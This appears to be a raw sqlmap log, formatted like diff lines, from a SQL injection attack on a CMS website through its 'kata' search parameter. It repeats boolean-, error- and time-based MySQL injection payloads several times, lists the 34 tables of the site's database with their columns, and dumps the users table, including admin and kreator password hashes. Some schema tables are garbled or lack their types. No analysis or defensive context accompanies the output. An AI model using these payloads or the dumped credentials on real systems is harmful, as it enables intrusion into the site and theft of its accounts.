+| Column     | Type          |
++------------+---------------+
+| dibaca     | enum('Y','N') |
+| email      | varchar(100)  |
+| id_hubungi | int(5)        |
+| jam        | time          |
+| lampiran   | varchar(255)  |
+| nama       | varchar(50)   |
+| pesan      | text          |
+| subjek     | varchar(100)  |
+| tanggal    | date          |
++------------+---------------+
+
+Database: d4t4_arpusd4
+Table: poling
+[6 columns]
++-----------+---------------+
+| Column    | Type          |
++-----------+---------------+
+| status    | varchar(20)   |
+| aktif     | enum('Y','N') |
+| id_poling | int(5)        |
+| pilihan   | varchar(100)  |
+| rating    | int(5)        |
+| username  | varchar(50)   |
++-----------+---------------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: katajelek
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| ganti    | varchar(60) |
+| id_jelek | int(11)     |
+| kata     | varchar(60) |
+| username | varchar(50) |
++----------+-------------+
+
+Database: d4t4_arpusd4
+Table: playlist
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| gbr_playlist | varchar(100)  |
+| id_playlist  | int(5)        |
+| jdl_playlist | varchar(100)  |
+| playlist_seo | varchar(100)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: video
+[14 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dilihat     | int(7)       |
+| gbr_video   | varchar(100) |
+| hari        | varchar(20)  |
+| id_playlist | int(5)       |
+| id_video    | int(5)       |
+| jam         | time         |
+| jdl_video   | varchar(100) |
+| keterangan  | text         |
+| tagvid      | varchar(100) |
+| tanggal     | date         |
+| username    | varchar(30)  |
+| video       | varchar(100) |
+| video_seo   | varchar(100) |
+| youtube     | varchar(100) |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: tbl_comment
+[7 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| alamat_email     | varchar(150) |
+| id_komentar      | int(5)       |
+| isi_pesan        | text         |
+| jam_komentar     | time         |
+| nama_lengkap     | varchar(150) |
+| reply            | int(5)       |
+| tanggal_komentar | date         |
++------------------+--------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[18 columns]
++-------------------+---------------+
+| Column            | Type          |
++-------------------+---------------+
+| status            | enum('Y','N') |
+| aktif             | enum('Y','N') |
+| gambar            | varchar(100)  |
+| hari              | varchar(20)   |
+| headline          | enum('Y','N') |
+| id_berita         | int(5)        |
+| id_kategori       | int(5)        |
+| isi_berita        | longtext      |
+| jam               | time          |
+| judul             | varchar(100)  |
+| judul_seo         | text          |
+| keterangan_gambar | text          |
+| sub_judul         | varchar(255)  |
+| tag               |
+| tanggal           | date          |
+| username          | varchar(30)   |
+| utama             | enum('Y','N') |
+| youtube           | varchar(100)  |
++-------------------+---------------+
+
+Database: d4t4_arpusd4
+Table: kategori
+[6 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| aktif         | enum('Y','N') |
+| id_kategori   | int(5)        |
+| kategori_seo  | varchar(100)  |
+| nama_kategori | varchar(50)   |
+| sidebar       | int(10)       |
+| username      | varchar(50)   |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: tag
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[11 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| email          | varchar(100) |
+| facebook       | text         |
+| favicon        | varchar(50)  |
+| id_identitas   | int(5)       |
+| maps           | text         |
+| meta_deskripsi | varchar(250) |
+| meta_keyword   | varchar(250) |
+| nama_website   | varchar(100) |
+| no_telp        | varchar(20)  |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: agenda
+[13 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      | int(5)       |
+| gambar      | varchar(100) |
+| id_agenda   | int(5)       |
+| isi_agenda  | text         |
+| jam         | varchar(50)  |
+| pengirim    | varchar(100) |
+| tema        | varchar(100) |
+| tema_seo    | varchar(100) |
+| tempat      | varchar(100) |
+| tgl_mulai   | date         |
+| tgl_posting | date         |
+| tgl_selesai | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| nama     | varchar(255) |
+| username | varchar(50)  |
+| ym_icon  | int(3)       |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: users_modul
+[3 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| id_modul   | int(11)      |
+| id_session | varchar(255) |
+| id_umod    | int(11)      |
++------------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: komentarvid
+[8 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| id_komentar   | int(5)        |
+| id_video      | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| hits    | int(10)      |
+| ip      | varchar(20)  |
+| online  | varchar(255) |
+| tanggal | date         |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: download
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| hits        | int(3)       |
+| id_download | int(5)       |
+| judul       | varchar(100) |
+| nama_file   | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: album
+[8 columns]
++------------+
+| Column     |
++------------+
+| aktif      | enum('Y','N') |
+| album_seo  |
+| gbr_album  | varchar(100)  |
+| hits_album |
+| id_album   |
+| jdl_album  |
+| keterangan |
+| username   |
++------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: iklantengah
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_iklantengah | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[6 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| gallery_seo | varchar(100) |
+| gbr_gallery | varchar(100) |
+| id_gallery  | int(5)       |
+| jdl_gallery |
+| keterangan  | text         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: komentar
+[6 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| aktif        |
+| id_berita    |
+| id_komentar  | int(5) |
+| isi_komentar |
+| jam_komentar | time   |
+| tgl          | date   |
++--------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+Table: users
+[2 entries]
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| username | password                                                                                                                         |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+| admin    | 2c581ff86e8c6f782e6bf752b590311b372c17d5e421e02218cf6057f9c8fb340536dbe03f986ab267e797b18afc56f3dc60184017996df4f81975a992cff109 |
+| kreator  | af0abce6b145245cb892cbece27a67ccb29e963264ca290d1dd6fdd1ca61ffdac45e2979a178405fea17afe91d5e0024834c84adeb901e792f5165fd4acf8d4f |
++----------+----------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+Database: d4t4_arpusd4
+[34 tables]
++---------------+
+| agenda        |
+| album         |
+| background    |
+| banner        |
+| berita        |
+| download      |
+| gallery       |
+| halamanstatis |
+| header        |
+| hubungi       |
+| identitas     |
+| iklanatas     |
+| iklantengah   |
+| katajelek     |
+| kategori      |
+| komentar      |
+| komentarvid   |
+| logo          |
+| menu          |
+| mod_alamat    |
+| mod_ym        |
+| modul         |
+| pasangiklan   |
+| playlist      |
+| poling        |
+| sekilasinfo   |
+| statistik     |
+| tag           |
+| tagvid        |
+| tbl_comment   |
+| templates     |
+| users         |
+| users_modul   |
+| video         |
++---------------+
+
+Database: d4t4_arpusd4
+Table: download
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| hits        | int(3)       |
+| id_download | int(5)       |
+| judul       | varchar(100) |
+| nama_file   | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: users
+[9 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| level        | varchar(20)   |
+| blokir       | enum('Y','N') |
+| email        | varchar(100)  |
+| foto         | varchar(100)  |
+| id_session   | varchar(255)  |
+| nama_lengkap | varchar(100)  |
+| no_telp      | varchar(20)   |
+| password     | varchar(255)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: playlist
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| gbr_playlist | varchar(100)  |
+| id_playlist  | int(5)        |
+| jdl_playlist | varchar(100)  |
+| playlist_seo | varchar(100)  |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: templates
+[6 columns]
++--------------+---------------+
+| Column       | Type          |
++--------------+---------------+
+| aktif        | enum('Y','N') |
+| folder       | varchar(50)   |
+| id_templates | int(5)        |
+| judul        | varchar(100)  |
+| pembuat      | varchar(50)   |
+| username     | varchar(50)   |
++--------------+---------------+
+
+Database: d4t4_arpusd4
+Table: album
+[11 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| album_seo   | varchar(100)  |
+| gbr_album   | varchar(100)  |
+| hari        | varchar(20)   |
+| hits_album  | int(5)        |
+| id_album    | int(5)        |
+| jam         | time          |
+| jdl_album   | varchar(100)  |
+| keterangan  | text          |
+| tgl_posting | date          |
+| username    | varchar(50)   |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: katajelek
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| ganti    | varchar(60) |
+| id_jelek | int(11)     |
+| kata     | varchar(60) |
+| username | varchar(50) |
++----------+-------------+
+
+Database: d4t4_arpusd4
+Table: banner
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_banner   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_alamat
+[2 columns]
++-----------+--------+
+| Column    | Type   |
++-----------+--------+
+| alamat    | text   |
+| id_alamat | int(5) |
++-----------+--------+
+
+Database: d4t4_arpusd4
+Table: statistik
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| hits    | int(10)      |
+| ip      | varchar(20)  |
+| online  | varchar(255) |
+| tanggal | date         |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: mod_ym
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(11)      |
+| nama     | varchar(255) |
+| username | varchar(50)  |
+| ym_icon  | int(3)       |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: background
+[2 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| gambar        | varchar(255) |
+| id_background | int(5)       |
++---------------+--------------+
+
+Database: d4t4_arpusd4
+Table: halamanstatis
+[10 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      | int(5)       |
+| gambar      | varchar(100) |
+| hari        | varchar(20)  |
+| id_halaman  | int(5)       |
+| isi_halaman | text         |
+| jam         | time         |
+| judul       | varchar(100) |
+| judul_seo   | varchar(100) |
+| tgl_posting | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: tbl_comment
+[7 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| alamat_email     | varchar(150) |
+| id_komentar      | int(5)       |
+| isi_pesan        | text         |
+| jam_komentar     | time         |
+| nama_lengkap     | varchar(150) |
+| reply            | int(5)       |
+| tanggal_komentar | date         |
++------------------+--------------+
+
+Database: d4t4_arpusd4
+Table: logo
+[2 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| gambar  | varchar(100) |
+| id_logo | int(5)       |
++---------+--------------+
+
+Database: d4t4_arpusd4
+Table: video
+[14 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dilihat     | int(7)       |
+| gbr_video   | varchar(100) |
+| hari        | varchar(20)  |
+| id_playlist | int(5)       |
+| id_video    | int(5)       |
+| jam         | time         |
+| jdl_video   | varchar(100) |
+| keterangan  | text         |
+| tagvid      | varchar(100) |
+| tanggal     | date         |
+| username    | varchar(30)  |
+| video       | varchar(100) |
+| video_seo   | varchar(100) |
+| youtube     | varchar(100) |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: header
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| url         | varchar(100) |
+| gambar      | varchar(100) |
+| id_header   | int(5)       |
+| judul       | varchar(100) |
+| tgl_posting | date         |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: kategori
+[6 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| aktif         | enum('Y','N') |
+| id_kategori   | int(5)        |
+| kategori_seo  | varchar(100)  |
+| nama_kategori | varchar(50)   |
+| sidebar       | int(10)       |
+| username      | varchar(50)   |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: iklantengah
+[6 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_iklantengah | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
+| username       | varchar(50)  |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: agenda
+[13 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| dibaca      | int(5)       |
+| gambar      | varchar(100) |
+| id_agenda   | int(5)       |
+| isi_agenda  | text         |
+| jam         | varchar(50)  |
+| pengirim    | varchar(100) |
+| tema        | varchar(100) |
+| tema_seo    | varchar(100) |
+| tempat      | varchar(100) |
+| tgl_mulai   | date         |
+| tgl_posting | date         |
+| tgl_selesai | date         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: sekilasinfo
+[5 columns]
++-------------+---------------+
+| Column      | Type          |
++-------------+---------------+
+| aktif       | enum('Y','N') |
+| gambar      | varchar(100)  |
+| id_sekilas  | int(5)        |
+| info        | varchar(100)  |
+| tgl_posting | date          |
++-------------+---------------+
+
+Database: d4t4_arpusd4
+Table: tagvid
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: iklanatas
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| url          | varchar(100) |
+| gambar       | varchar(100) |
+| id_iklanatas | int(5)       |
+| judul        | varchar(100) |
+| tgl_posting  | date         |
+| username     | varchar(50)  |
++--------------+--------------+
+
+Database: d4t4_arpusd4
+Table: komentar
+[9 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| email         | varchar(100)  |
+| id_berita     | int(5)        |
+| id_komentar   | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: berita
+[19 columns]
++-------------------+---------------+
+| Column            | Type          |
++-------------------+---------------+
+| status            | enum('Y','N') |
+| aktif             | enum('Y','N') |
+| dibaca            | int(5)        |
+| gambar            | varchar(100)  |
+| hari              | varchar(20)   |
+| headline          | enum('Y','N') |
+| id_berita         | int(5)        |
+| id_kategori       | int(5)        |
+| isi_berita        | longtext      |
+| jam               | time          |
+| judul             | varchar(100)  |
+| judul_seo         | text          |
+| keterangan_gambar | text          |
+| sub_judul         | varchar(255)  |
+| tag               | varchar(100)  |
+| tanggal           | date          |
+| username          | varchar(30)   |
+| utama             | enum('Y','N') |
+| youtube           | varchar(100)  |
++-------------------+---------------+
+
+Database: d4t4_arpusd4
+Table: modul
+[11 columns]
++----------------+----------------------+
+| Column         | Type                 |
++----------------+----------------------+
+| status         | enum('user','admin') |
+| aktif          | enum('Y','N')        |
+| gambar         | varchar(100)         |
+| id_modul       | int(5)               |
+| link           | varchar(100)         |
+| link_seo       | varchar(50)          |
+| nama_modul     | varchar(50)          |
+| publish        | enum('Y','N')        |
+| static_content | text                 |
+| urutan         | int(5)               |
+| username       | varchar(50)          |
++----------------+----------------------+
+
+Database: d4t4_arpusd4
+Table: identitas
+[11 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| email          | varchar(100) |
+| facebook       | text         |
+| favicon        | varchar(50)  |
+| id_identitas   | int(5)       |
+| maps           | text         |
+| meta_deskripsi | varchar(250) |
+| meta_keyword   | varchar(250) |
+| nama_website   | varchar(100) |
+| no_telp        | varchar(20)  |
+| rekening       | varchar(100) |
++----------------+--------------+
+
+Database: d4t4_arpusd4
+Table: tag
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| count    | int(5)       |
+| id_tag   | int(5)       |
+| nama_tag | varchar(100) |
+| tag_seo  | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+
+Database: d4t4_arpusd4
+Table: poling
+[6 columns]
++-----------+---------------+
+| Column    | Type          |
++-----------+---------------+
+| status    | varchar(20)   |
+| aktif     | enum('Y','N') |
+| id_poling | int(5)        |
+| pilihan   | varchar(100)  |
+| rating    | int(5)        |
+| username  | varchar(50)   |
++-----------+---------------+
+
+Database: d4t4_arpusd4
+Table: users_modul
+[3 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| id_modul   | int(11)      |
+| id_session | varchar(255) |
+| id_umod    | int(11)      |
++------------+--------------+
+
+Database: d4t4_arpusd4
+Table: gallery
+[7 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| gallery_seo | varchar(100) |
+| gbr_gallery | varchar(100) |
+| id_album    | int(5)       |
+| id_gallery  | int(5)       |
+| jdl_gallery | varchar(100) |
+| keterangan  | text         |
+| username    | varchar(50)  |
++-------------+--------------+
+
+Database: d4t4_arpusd4
+Table: menu
+[7 columns]
++-----------+----------------------+
+| Column    | Type                 |
++-----------+----------------------+
+| position  | enum('Top','Bottom') |
+| aktif     | enum('Ya','Tidak')   |
+| id_menu   | int(5)               |
+| id_parent | int(5)               |
+| link      | varchar(100)         |
+| nama_menu | varchar(30)          |
+| urutan    | int(3)               |
++-----------+----------------------+
+
+Database: d4t4_arpusd4
+Table: hubungi
+[9 columns]
++------------+---------------+
+| Column     | Type          |
++------------+---------------+
+| dibaca     | enum('Y','N') |
+| email      | varchar(100)  |
+| id_hubungi | int(5)        |
+| jam        | time          |
+| lampiran   | varchar(255)  |
+| nama       | varchar(50)   |
+| pesan      | text          |
+| subjek     | varchar(100)  |
+| tanggal    | date          |
++------------+---------------+
+
+Database: d4t4_arpusd4
+Table: komentarvid
+[8 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| url           | varchar(100)  |
+| aktif         | enum('Y','N') |
+| id_komentar   | int(5)        |
+| id_video      | int(5)        |
+| isi_komentar  | text          |
+| jam_komentar  | time          |
+| nama_komentar | varchar(100)  |
+| tgl           | date          |
++---------------+---------------+
+
+Database: d4t4_arpusd4
+Table: pasangiklan
+[6 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| url            | varchar(100) |
+| gambar         | varchar(100) |
+| id_pasangiklan | int(5)       |
+| judul          | varchar(100) |
+| tgl_posting    | date         |
+| username       | varchar(50)  |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: kata (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: kata=1%' AND 8507=8507 AND 'IPFB%'='IPFB&cari=Search
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: kata=1%' AND (SELECT 6991 FROM(SELECT COUNT(*),CONCAT(0x7162767a71,(SELECT (ELT(6991=6991,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gSOl%'='gSOl&cari=Search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: kata=1%' AND (SELECT 1320 FROM (SELECT(SLEEP(10)))JJHX) AND 'fMwd%'='fMwd&cari=Search
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.0
+available databases [2]:
+[*] d4t4_arpusd4
+[*] information_schema
+
